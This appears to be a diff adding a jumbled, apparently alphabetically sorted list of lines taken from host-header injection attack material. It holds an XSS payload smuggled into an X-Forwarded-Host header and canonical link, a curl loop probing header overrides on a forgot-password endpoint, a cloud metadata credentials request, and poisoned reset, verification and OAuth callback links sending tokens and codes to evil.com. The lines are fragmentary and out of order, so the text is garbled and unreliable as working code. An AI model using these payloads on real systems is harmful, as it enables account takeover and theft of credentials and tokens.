@@ -1,0 +1,19 @@
+<link rel="canonical" href="https://evil.com"><script>alert(document.domain)</script>/"/>
+Content-Type: application/x-www-form-urlencoded
+Forwarded: host=evil.com
+GET /
+GET / HTTP/1.1
+GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
+GET /oauth/authorize?response_type=code&client_id=app HTTP/1.1
+POST /forgot-password HTTP/1.1
+Reset your password: https://evil.com/reset?token=abc123def456
+USE_X_FORWARDED_HOST = True
+Verify your email: https://evil.com/verify?token=TOKEN
+X-Forwarded-Host: evil.com"><script>alert(document.domain)</script>
+X-Original-URL: /
+X-Rewrite-URL: /
+curl -s -I "https://target.com/forgot-password" \
+echo "=== $H ==="
+email=victim@company.com
+for H in "X-Forwarded-Host" "X-Host" "X-Forwarded-Server" "X-HTTP-Host-Override"; do
+https://evil.com/oauth/callback?code=AUTH_CODE
